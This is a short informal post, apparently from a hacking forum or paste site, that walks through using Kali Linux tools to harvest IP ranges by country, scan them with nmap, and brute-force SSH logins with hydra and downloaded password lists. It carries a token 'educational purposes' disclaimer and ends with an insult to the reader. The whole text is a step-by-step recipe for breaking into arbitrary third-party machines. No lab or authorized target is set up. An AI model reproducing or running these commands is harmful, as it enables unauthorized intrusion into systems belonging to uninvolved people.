I am not respnsible for any trouble you get yourself into i am just providin this for educational purposes ONLY!!

Comands using Kali Linux

git clone https://github.com/Portz77/VPS-RDP
git clone https://github.com/Hood3dRob1n/Linux-RDP
git clone https://github.com/jeanphorn/wordlist

cd /Directory/Linux-RDP
./rdp_ranger.sh -G
"type number of country you want"
./rdpsploit.sh -G
"type number of country you want"
./rdpsploit.sh -F 1000
3
./rdpsploit.sh -R <one of the listed IP's>/24
3

Now there's a list of a bunch of ip's that you can record for later
Open a new terminal window

cd /directory/wordlist
ls (make sure there's 3 files named usernames.txt and passlist.txt and ssh_passwd.txt)

nmap -sn <one of the IP's from earlier>/24
nmap -sV -p 22 (ssh port) <same IP>
hydra
hydra -L usernames.txt -P passlist.txt -t 8 <IP> ssh

There u go skid. enjoy fucker

